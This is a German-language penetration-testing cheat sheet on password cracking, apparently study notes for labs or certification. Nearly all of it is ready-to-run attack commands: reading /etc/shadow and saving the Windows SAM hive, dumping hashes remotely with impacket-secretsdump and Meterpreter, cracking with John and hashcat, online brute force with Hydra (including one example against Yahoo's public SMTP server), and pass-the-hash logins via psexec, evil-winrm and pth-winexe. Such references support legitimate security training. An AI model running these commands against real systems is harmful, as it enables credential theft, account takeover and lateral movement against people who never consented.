# Password Cracking

> **Wichtig:** Zuerst googlen oder Online-Tools nutzen – spart viel Zeit!

---

## Hash-Speicherorte

```
Linux   → /etc/shadow
         Format: $id$salt$hash
         $1  = MD5-based crypt (md5crypt)
         $5  = SHA-256crypt
         $6  = SHA-512crypt (sha512crypt) – häufigster in modernen Systemen

Windows → C:\Windows\System32\config\sam
         Format: uid:rid:LM-Hash:NTLM-Hash
         LM Hash veraltet → leerer Hash = aad3b435b51404eeaad3b435b51404ee

Active Directory → NTDS.dit (auf dem Domain Controller)
```

---

## Hash Dumps

### Linux

```bash
cat /etc/shadow                                    # direkt lesen (root nötig)
unshadow /etc/passwd /etc/shadow > hashes.txt     # kombinieren für John
```

### Windows – SAM lokal

```cmd
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security
```

### Impacket – secretsdump (remote + lokal)

```bash
# Remote – SAM + LSA Secrets dumpen
impacket-secretsdump <domain>/<user>:<password>@<ip>
impacket-secretsdump Administrator:password@10.10.10.10

# Mit Hash (Pass-the-Hash)
impacket-secretsdump -hashes :<NTLM-Hash> Administrator@10.10.10.10

# Lokal – aus gespeicherten Registry-Dateien
impacket-secretsdump -sam sam -system system -security security LOCAL
# Ausgabe: Administrator:500:LM-Hash:NTLM-Hash:::
```

### Meterpreter

```bash
meterpreter > hashdump      # SAM-Hashes direkt dumpen
```

---

## Hash Identifizieren

```bash
hash-identifier               # interaktives Tool
hashid <hash>                 # direkte Ausgabe
```

---

## John the Ripper

```bash
# Grundbefehl
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ergebnisse anzeigen
john --show hashes.txt

# Format erzwingen
john --format=NT hashes.txt --wordlist=rockyou.txt
john --format=sha512crypt shadow.txt --wordlist=rockyou.txt

# Alle Formate anzeigen
john --list=formats
```

### Hash-Konverter (john2*)

```bash
# ZIP → Hash
zip2john protected.zip > zip.hash
# Extrahiert den crackbaren Hash aus der ZIP-Datei

# RAR → Hash
rar2john protected.rar > rar.hash

# KeePass → Hash
keepass2john Database.kdbx > keepass.hash
# Konvertiert .kdbx in crackbaren Hash

# SSH Private Key → Hash
ssh2john id_rsa > ssh.hash
# Extrahiert Hash aus passwortgeschütztem SSH-Key

# PDF → Hash
pdf2john protected.pdf > pdf.hash

# 7-Zip → Hash
7z2john protected.7z > 7z.hash

# Office-Dateien (Word, Excel) → Hash
office2john document.docx > office.hash

# GPG → Hash
gpg2john private.gpg > gpg.hash

# Danach immer:
john --wordlist=/usr/share/wordlists/rockyou.txt <datei>.hash
john --show <datei>.hash
```

---

## Hashcat

```bash
# Grundbefehl
hashcat -m <modus> -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Wichtige Angriffsmodi (-a):
# -a 0  → Dictionary Attack (Wortliste)
# -a 1  → Combination (2 Wortlisten kombiniert)
# -a 3  → Brute Force / Mask Attack
# -a 6  → Wortliste + Mask

# Hash-Modi (-m):
# -m 0     → MD5
# -m 100   → SHA1
# -m 400   → WordPress (MD5)
# -m 500   → MD5crypt (Linux $1$)
# -m 1000  → NTLM (Windows)
# -m 1400  → SHA-256
# -m 1700  → SHA-512
# -m 1800  → SHA-512crypt (Linux $6$)
# -m 3200  → bcrypt
# -m 13400 → KeePass
# -m 13600 → ZIP (AES)
# -m 16500 → JWT

# Dictionary Attack
hashcat -m 1000 -a 0 ntlm.hash rockyou.txt

# Brute Force (alle 4-stelligen Zahlen)
hashcat -m 0 -a 3 hash.txt ?d?d?d?d
# ?d = Zahl  ?l = Kleinbuchstabe  ?u = Großbuchstabe  ?s = Sonderzeichen  ?a = alle

# Mit Regeln (mutiert Wörter: password → P@ssw0rd)
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Beispiel WordPress
hashcat -m 400 -a 0 -o wppass.txt --remove wp.hash rockyou.txt

# Ergebnisse anzeigen
hashcat -m 1000 hash.txt --show
```

---

## Hydra – Online Brute Force

```bash
# SSH
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip> -t 4
# -l : Username  -P : Passwortliste  -t : Threads

# FTP
hydra -l user -P rockyou.txt ftp://<ip>

# RDP
hydra -l administrator -P rockyou.txt rdp://<ip>

# SMB
hydra -l administrator -P rockyou.txt smb://<ip>

# MySQL
hydra -l root -P rockyou.txt mysql://<ip>

# HTTP POST Form
sudo hydra <ip> http-post-form "<path>:<login_credentials>:<invalid_response>"
# Beispiel:
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
# ^USER^ und ^PASS^ werden durch Werte aus -l/-P ersetzt
# F=incorrect : String der bei Fehlschlag erscheint

# SMTP (mit SSL)
hydra -l email@yahoo.com -P passwortliste.lst -s 465 -S -v -V -t 1 smtp.mail.yahoo.com smtp
# -s 465 : Port  -S : SSL/TLS  -v -V : verbose  -t 1 : 1 Thread (SMTP empfindlich)

# Mehrere User (-L statt -l)
hydra -L users.txt -P rockyou.txt ssh://<ip>
```

---

## Medusa

```bash
medusa -u admin -P rockyou.txt -h <ip> -M ssh
# -M : Modul (ssh, ftp, http, smb...)
```

---

## CrackMapExec

```bash
crackmapexec smb <ip> -u admin -p rockyou.txt          # Brute Force
crackmapexec smb <ip> -u admin -H <NTLM-Hash>          # Pass-the-Hash
crackmapexec smb <ip/range> -u admin -p password        # Netzwerk-Sweep
crackmapexec smb <ip> -u admin -p password --sam        # SAM dumpen
```

---

## Pass-the-Hash

```bash
# Einloggen ohne Klartextpasswort, nur mit NTLM Hash
impacket-psexec -hashes :<NTLM-Hash> Administrator@<ip>
evil-winrm -i <ip> -u Administrator -H <NTLM-Hash>
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:<NTLM>' //<ip> cmd.exe
```

---

## fcrackzip – ZIP Passwort knacken

```bash
# Wann nutzen? → Passwortgeschützte ZIP-Datei gefunden

# Dictionary Attack
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected.zip
# -u : unzip zum Verifizieren  -D : Dictionary Mode  -p : Wortliste

# Brute Force
fcrackzip -u -b -c 'aA1!' -l 1-6 protected.zip
# -b : Brute Force  -c : Zeichensatz (a=klein, A=groß, 1=Zahlen, !=Sonderzeichen)  -l : Länge

# Alternative mit John
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
john --show zip.hash
```

---

## Online Tools

```
https://crackstation.net
https://hashes.com/en/decrypt/hash
https://hashkiller.io/listmanager
https://onlinehashcrack.com
https://gchq.github.io/CyberChef/     → auch für Encoding/Decoding
```

---

## Wortlisten / Dictionaries

```
/usr/share/wordlists/rockyou.txt          → Standard (Kali)
https://github.com/danielmiessler/SecLists → viele Wortlisten (auch Usernames etc.)
https://weakpass.com/wordlist              → Passwort-Dumps
https://packetstormsecurity.com/Crackers/wordlists
```

---

## Offline Crack Tools

```
mimikatz, pwdump, fgdump, wce, L0phtCrack, OphCrack,
RainbowCrack, Cain & Abel, John the Ripper, Hashcat
```

## Online Crack Tools

```
Aircrack-ng, pth-winexe, Brutus, Hydra, THC-Hydra, Medusa, Ncrack, Burp Suite Intruder
```
